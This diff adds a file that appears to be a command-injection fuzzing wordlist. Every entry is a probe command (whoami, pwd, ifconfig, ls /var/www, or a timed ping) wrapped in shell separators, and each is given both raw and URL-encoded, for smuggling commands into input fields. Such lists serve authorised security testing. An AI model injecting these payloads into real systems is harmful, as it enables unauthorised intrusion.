@@ -1,0 +1,73 @@
+; whoami ;
+%3B%20whoami%20%3B
+& whoami &
+%26%20whoami%20%26
+| whoami |
+%7C%20whoami%20%7C
+&& whoami &&
+%26%26%20whoami%20%26%26
+|| whoami ||
+%7C%7C%20whoami%20%7C%7C
+# whoami #
+%23%20whoami%20%23
+; pwd ;
+%3B%20pwd%20%3B
+& pwd &
+%26%20pwd%20%26
+| pwd |
+%7C%20pwd%20%7C
+|| pwd ||
+%7C%7C%20pwd%20%7C%7C
+&& pwd &&
+%26%26%20pwd%20%26%26
+# pwd #
+%23%20pwd%20%23
+; ifconfig ;
+%3B%20ifconfig%20%3B
+| ifconfig |
+%7C%20ifconfig%20%7C
+|| ifconfig ||
+%7C%7C%20ifconfig%20%7C%7C
+& ifconfig &
+%26%20ifconfig%20%26
+&& ifconfig &&
+%26%26%20ifconfig%20%26%26
+# ifconfig #
+%23%20ifconfig%20%23
+; ping -c 10 8.8.8.8 ;
+%3B%20ping%20-c%2010%208.8.8.8%20%3B
+| ping -c 10 8.8.8.8 |
+%7C%20ping%20-c%2010%208.8.8.8%20%7C
+|| ping -c 10 8.8.8.8 ||
+%7C%7C%20ping%20-c%2010%208.8.8.8%20%7C%7C
+& ping -c 10 8.8.8.8 &
+%26%20ping%20-c%2010%208.8.8.8%20%26
+&& ping -c 10 8.8.8.8 &&
+%26%26%20ping%20-c%2010%208.8.8.8%20%26%26
+# ping -c 10 8.8.8.8 #
+%23%20ping%20-c%2010%208.8.8.8%20%23
+; ls /var/www ;
+%3B%20ls%20%2fvar%2fwww%20%3B
+| ls /var/www |
+%7C%20ls%20%2fvar%2fwww%20%7C
+& ls /var/www &
+%26%20ls%20%2fvar%2fwww%20%26
+&& ls /var/www &&
+%26%26%20ls%20%2fvar%2fwww%20%26%26
+|| ls /var/www ||
+%7C%7C%20ls%20%2fvar%2fwww%20%7C%7C
+# ls /var/www #
+%23%20ls%20%2fvar%2fwww%20%23
+|| ping -n 10 127.0.0.1 &
+%7C%7C%20ping%20-n%2010%20127.0.0.1%20%26
+|| ping -n 10 127.0.0.1 ;
+%7C%7C%20ping%20-n%2010%20127.0.0.1%20%3B
+|| ping -n 10 127.0.0.1 #
+%7C%7C%20ping%20-n%2010%20127.0.0.1%20%23
+; ping -n 10 127.0.0.1 &
+%3B%20ping%20-n%2010%20127.0.0.1%20%26
+; ping -n 10 127.0.0.1 &&
+%3B%20ping%20-n%2010%20127.0.0.1%20%26%26
+
+
+
